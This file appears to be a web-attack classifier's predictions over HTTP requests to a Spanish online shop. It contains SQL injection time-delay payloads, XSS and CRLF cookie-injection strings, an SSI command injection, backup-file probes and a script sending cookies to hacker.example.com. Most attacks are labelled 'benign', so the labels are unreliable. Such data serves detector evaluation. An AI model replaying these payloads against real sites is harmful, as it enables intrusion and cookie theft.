row_idx,text,pred_label,max_prob
11,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=idA=2 PROTOCOL=HTTP/1.1,benign,0.42545053362846375
12,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
13,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsg=%2B PROTOCOL=HTTP/1.1,benign,0.5685669183731079
14,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
15,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsgA=Credenciales+incorrectas PROTOCOL=HTTP/1.1,benign,0.5995876789093018
16,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
17,METHOD=GET PATH=/IISSamples/sdk/asp/applications/Application_VBScript.asp QUERY= PROTOCOL=HTTP/1.1,command_exec,0.4178754389286041
18,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=183%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja PROTOCOL=HTTP/1.1,benign,0.7224836945533752
19,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
20,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=183&B1=Pasar+por+caja%2F PROTOCOL=HTTP/1.1,benign,0.6922904253005981
21,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
22,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=183&B1A=Pasar+por+caja PROTOCOL=HTTP/1.1,benign,0.6982263922691345
23,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
24,METHOD=PUT PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5984482765197754
25,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&login=armand&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dni=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&provincia=Zaragoza&ntc=8608089924764976&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.958597719669342
26,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
27,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=armand&password=prusiato&nombre=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dni=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&provincia=Zaragoza&ntc=8608089924764976&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9654841423034668
28,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
29,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=bau*gnon&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dni=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&provincia=Zaragoza&ntc=8608089924764976&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9695590138435364
30,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
31,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=armand&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dniA=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&provincia=Zaragoza&ntc=8608089924764976&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9703530669212341
32,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
33,METHOD=GET PATH=/asf-logo-wide.gif QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4941527843475342
34,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2=Vaciar+carrito%7C PROTOCOL=HTTP/1.1,benign,0.5088252425193787
35,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
36,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2A=Vaciar+carrito PROTOCOL=HTTP/1.1,benign,0.5375930070877075
37,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
38,METHOD=GET PATH=/tienda1/global/menum.jsp/4861362529278789730 QUERY= PROTOCOL=HTTP/1.1,benign,0.569188117980957
39,METHOD=GET PATH=/iisstart.htm QUERY= PROTOCOL=HTTP/1.1,benign,0.40825948119163513
40,METHOD=GET PATH=/travelnet/home.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.3531954884529114
41,METHOD=GET PATH=/tienda1/miembros/imagenes.BAK QUERY= PROTOCOL=HTTP/1.1,benign,0.664242684841156
42,METHOD=GET PATH=/tienda1/miembros/imagenes/zarauz.jpg/asf-logo-wide.gif.old QUERY= PROTOCOL=HTTP/1.1,benign,0.656399667263031
43,METHOD=GET PATH=/tienda1/miembros/index.jsp/ QUERY= PROTOCOL=HTTP/1.1,benign,0.6636343598365784
44,METHOD=GET PATH=/tienda1/miembros/index.jsp.INC QUERY= PROTOCOL=HTTP/1.1,benign,0.6538090705871582
45,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9725950360298157
46,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
47,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=%2500&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.971099853515625
48,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
49,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=thyagara&password=fUeRTe&nombre=Il%2Ci%3Fdio&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9708005785942078
50,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
51,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidosA=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9724579453468323
52,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
53,METHOD=GET PATH=/_cti_pvt/access.cnf QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3776009678840637
54,METHOD=GET PATH=/6909030637832563290.jsp.OLD QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.38819339871406555
55,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.767042875289917
56,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
57,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=3%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=1&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6915635466575623
58,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
59,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=1&B1A=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6924940347671509
60,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
61,METHOD=GET PATH=/CFIDE/administrator/login.cfm QUERY= PROTOCOL=HTTP/1.1,benign,0.5035340785980225
62,METHOD=PUT PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.453521728515625
63,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&pwd=c69p04e13&remember=off&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8327369093894958
64,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
65,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=modestin&pwd=es%27pec%27ia%2Fl&remember=off&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.7855685353279114
66,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
67,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&loginA=modestin&pwd=c69p04e13&remember=off&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.7881190180778503
68,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
69,METHOD=GET PATH=/tienda1/4861362529278789730 QUERY= PROTOCOL=HTTP/1.1,benign,0.42522743344306946
70,METHOD=PUT PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4434623420238495
71,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=id=%253F PROTOCOL=HTTP/1.1,benign,0.44440582394599915
72,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
73,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=idA=1 PROTOCOL=HTTP/1.1,benign,0.4123231768608093
74,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
75,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp.Old QUERY= PROTOCOL=HTTP/1.1,benign,0.46179723739624023
76,METHOD=GET PATH=/tienda1/asf-logo-wide QUERY= PROTOCOL=HTTP/1.1,benign,0.4528677463531494
77,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org PROTOCOL=HTTP/1.1,benign,0.6921690702438354
78,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
79,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsg=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C PROTOCOL=HTTP/1.1,benign,0.5976505875587463
80,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
81,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsgA=Credenciales+incorrectas PROTOCOL=HTTP/1.1,benign,0.5995876789093018
82,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
83,METHOD=GET PATH=/tienda1/publico/miembros.jsp.bak QUERY= PROTOCOL=HTTP/1.1,benign,0.6752377152442932
84,METHOD=GET PATH=/iisadmpwd/achg.htr QUERY= PROTOCOL=HTTP/1.1,benign,0.4740259647369385
85,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=1764any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Pasar+por+caja PROTOCOL=HTTP/1.1,benign,0.6934089660644531
86,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
87,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=1764&B1=Confirmar%2F PROTOCOL=HTTP/1.1,benign,0.6989395022392273
88,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
89,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modoA=insertar&precio=1764&B1=Pasar+por+caja PROTOCOL=HTTP/1.1,benign,0.6935290694236755
90,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
91,METHOD=GET PATH=/tienda1/publico/4861362529278789730.bak QUERY= PROTOCOL=HTTP/1.1,benign,0.5315982699394226
92,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=audy&password=8a9c27%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Juan&apellidos=Ricart+Rizzi&email=taube%40farmaoferta.bi&dni=94839637B&direccion=Calle+San+Indalencio+168+&ciudad=San+Jos%E9+del+Valle&cp=33783&provincia=Zamora&ntc=8868360012752422&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9462767243385315
93,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
94,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=audy&password=8a9c27&nombre=%3FP%27r%F3spero&apellidos=Ricart+Rizzi&email=taube%40farmaoferta.bi&dni=94839637B&direccion=Calle+San+Indalencio+168+&ciudad=San+Jos%E9+del+Valle&cp=33783&provincia=Zamora&ntc=8868360012752422&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9506160020828247
95,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
96,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&loginA=audy&password=8a9c27&nombre=Juan&apellidos=Ricart+Rizzi&email=taube%40farmaoferta.bi&dni=94839637B&direccion=Calle+San+Indalencio+168+&ciudad=San+Jos%E9+del+Valle&cp=33783&provincia=Zamora&ntc=8868360012752422&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9482866525650024
97,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
98,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org PROTOCOL=HTTP/1.1,benign,0.6696673631668091
99,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
100,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2A=Vaciar+carrito PROTOCOL=HTTP/1.1,benign,0.5375930070877075
101,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
102,METHOD=GET PATH=/tienda1/global/menum.jsp/6909030637832563290.jsp.Old QUERY= PROTOCOL=HTTP/1.1,benign,0.5131661891937256
103,METHOD=GET PATH=/tienda1/miembros/imagenes/ogono.jpg.old QUERY= PROTOCOL=HTTP/1.1,benign,0.6986789703369141
104,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=ballarte&password=misT66L&nombre=Zorella&apellidos=Morera&email=cossar%40asdn.be&dni=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&direccion=Calle+Alvarez+De+Castro+197%2C+&ciudad=Vila-real&cp=19160&provincia=Ja%E9n&ntc=5645703984950542&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9714010953903198
105,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
106,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=ballarte&password=misT66L&nombre=Zorella&apellidos=Morera&email=cossar%40asdn.be&dni=36813756W&direccion=Calle+Alvarez+De+Castro+197%2C+&ciudad=Vila-real&cp=19160&provincia=Ja%E9n&ntc=966948476857778&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9748899340629578
107,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
108,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=ballarte&password=misT66L&nombre=Zorella&apellidos=Morera&email=cossar%40asdn.be&dni=36813756W&direccion=Calle+Alvarez+De+Castro+197%2C+&ciudadA=Vila-real&cp=19160&provincia=Ja%E9n&ntc=5645703984950542&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9748387336730957
109,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
110,METHOD=GET PATH=/tienda1/miembros/asf-logo-wide.gif.old QUERY= PROTOCOL=HTTP/1.1,benign,0.6386026740074158
111,METHOD=GET PATH=/travelnet/home.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.3531954884529114
112,METHOD=GET PATH=/tienda1/imagenes/1.gif.BAK QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44717925786972046
113,METHOD=GET PATH=/scripts/tools/mkilog.exe QUERY= PROTOCOL=HTTP/1.1,benign,0.521488606929779
114,METHOD=GET PATH=/tienda1/imagenes/logo.gif.old QUERY= PROTOCOL=HTTP/1.1,benign,0.48830628395080566
115,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Vino+Riojaany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&precio=39&cantidad=73&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6746994256973267
116,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
117,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Vino+.*%3FRioja&precio=39&cantidad=73&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6730353236198425
118,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
119,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=c%2F%3Fa%2Cry&pwd=0ara7s5o&remember=on&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8483027219772339
120,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
121,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=lucie8&pwdA=0ara7s5o&remember=on&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8386269807815552
122,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
123,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=id=1%2520 PROTOCOL=HTTP/1.1,benign,0.4275350868701935
124,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
125,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=idA=1 PROTOCOL=HTTP/1.1,benign,0.4123231768608093
126,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
127,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp/ QUERY= PROTOCOL=HTTP/1.1,benign,0.4508140981197357
128,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsg=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235 PROTOCOL=HTTP/1.1,benign,0.6421651840209961
129,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
130,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsgA=Credenciales+incorrectas PROTOCOL=HTTP/1.1,benign,0.5995876789093018
131,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
132,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=306&B1=Pasar+por+caja%2F PROTOCOL=HTTP/1.1,benign,0.6863402724266052
133,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
134,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modoA=insertar&precio=306&B1=Pasar+por+caja PROTOCOL=HTTP/1.1,benign,0.6780965924263
135,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
136,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=couse&password=remanoso&nombre=Viviana&apellidos=Guimera+Faraco%22+AND+%221%22%3D%221&email=andre%40alfombra.com.me&dni=13758311X&direccion=Calle+La+Fuente%2C+59%2C+13%3FB&ciudad=Algadefe&cp=46910&provincia=Burgos&ntc=5183768775927993&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9669496417045593
137,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
138,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=couse&password=remanoso&nombre=Viviana&apellidos=He%2Cusser&email=andre%40alfombra.com.me&dni=13758311X&direccion=Calle+La+Fuente%2C+59%2C+13%3FB&ciudad=Algadefe&cp=46910&provincia=Burgos&ntc=5183768775927993&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.966579020023346
139,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
140,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=couse&password=remanoso&nombre=Viviana&apellidos=Guimera+Faraco&emailA=andre%40alfombra.com.me&dni=13758311X&direccion=Calle+La+Fuente%2C+59%2C+13%3FB&ciudad=Algadefe&cp=46910&provincia=Burgos&ntc=5183768775927993&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9610286951065063
141,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
142,METHOD=GET PATH=/asf-logo-wide.gif/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42968156933784485
143,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2=Vaciar+carritoparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29 PROTOCOL=HTTP/1.1,benign,0.744479238986969
144,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
145,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2A=Vaciar+carrito PROTOCOL=HTTP/1.1,benign,0.5375930070877075
146,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
147,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
148,METHOD=GET PATH=/tienda1/global/creditos.jsp/asf-logo-wide.java QUERY= PROTOCOL=HTTP/1.1,benign,0.6239587664604187
149,METHOD=GET PATH=/tienda1/asf-logo-wide QUERY= PROTOCOL=HTTP/1.1,benign,0.4528677463531494
150,METHOD=GET PATH=/tienda1/miembros/imagenes/.inc QUERY= PROTOCOL=HTTP/1.1,benign,0.5880523324012756
151,METHOD=GET PATH=/tienda1/miembros/imagenes/zarauz.jpg/6909030637832563290.jsp.old QUERY= PROTOCOL=HTTP/1.1,benign,0.6898859739303589
